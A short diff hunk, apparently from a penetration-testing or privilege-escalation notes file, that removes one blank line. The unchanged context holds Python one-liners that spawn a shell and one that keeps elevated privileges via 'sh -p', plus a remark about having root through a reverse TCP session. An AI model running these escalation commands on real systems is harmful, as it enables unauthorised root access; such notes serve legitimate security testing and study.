@@ -16,5 +16,4 @@ python -c 'import os; os.system("/bin/sh")'
 *Escalate privleges*
 /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
-
 *You should have ROOT with the reverse TCP*
